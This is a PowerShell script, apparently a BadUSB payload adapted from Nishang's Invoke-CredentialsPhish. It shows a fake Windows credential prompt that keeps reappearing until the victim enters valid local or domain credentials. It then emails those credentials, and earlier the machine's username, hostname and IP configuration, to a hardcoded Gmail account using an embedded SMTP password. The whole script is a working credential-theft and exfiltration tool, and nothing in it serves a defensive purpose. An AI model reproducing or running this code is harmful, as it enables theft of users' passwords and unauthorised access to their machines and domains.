function Invoke-CredentialsPhish
{
<#
.SYNOPSIS
Nishang script which opens a user credential prompt.
.DESCRIPTION
This payload opens a prompt which asks for user credentials and does not go away till valid local or domain credentials are entered in the prompt.
.EXAMPLE
PS > Invoke-CredentialsPhish
.LINK
http://labofapenetrationtester.blogspot.com/
https://github.com/samratashok/nishang
#>

[CmdletBinding()]
Param ()

    $ErrorActionPreference="SilentlyContinue"
    Add-Type -assemblyname system.DirectoryServices.accountmanagement 
    $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
    $domainDN = "LDAP://" + ([ADSI]"").distinguishedName
    while($true)
    {
        $credential = $host.ui.PromptForCredential("Credentials are required to perform this operation", "Please enter user credentials", "$env:username","")
        if($credential)
        {
            $creds = $credential.GetNetworkCredential()
            [String]$user = $creds.username
            [String]$pass = $creds.password
            [String]$domain = $env:userdomain
            [String]$full_domain = [String]$domain + "\" + $user
            $authlocal = $DS.ValidateCredentials($user, $pass)
            $authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass)
            if(($authlocal -eq $true) -or ($authdomain.name -ne $null))
            {
                $local_creds= "Username: " + $user + " Password: " + $pass + " Domain:" + $full_domain
		# SEND SECOND EMAIL CONTAINING SYSTEM CREDENTIALS

		$System_Subject = "SYSTEM CREDENTIALS HIJACKED!!!!"
		$newline = "`r`n"
		Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $System_Subject -Body $local_creds -SmtpServer $SmtpServer -UseSsl -Credential $Credentials
                break
            }
        }
    }
}

$SmtpServer = 'smtp.gmail.com'
$SmtpUser = 'firmusphising@gmail.com'
$smtpPassword = 'Firmus@123'
$MailtTo = 'firmusphising@gmail.com'
$MailFrom = 'firmusphising@gmail.com'
$MailSubject = "BAD USB LINK CLICKED!!!!"
$Content  = $output
$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword | ConvertTo-SecureString -AsPlainText -Force) 




# SEND FIRST EMAIL FOR SYSTEM INFO

$username_command = whoami
$hostname_command = hostname
$ipaddr_command = ipconfig

$username_output = "Username : "
$hostname_output = "Hostname : "
$ip_output = "IP : "
$newline = "`r`n"

$sysinfo = $username_output+$username_command+$newline+$hostname_output+$hostname_command+$newline+$ip_output+$ipaddr_command+$newline
Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $MailSubject -Body $sysinfo -SmtpServer $SmtpServer -UseSsl -Credential $Credentials


# SEND SECOND EMAIL IF USER ENTER SYSTEM CREDENTIALS

Invoke-CredentialsPhish








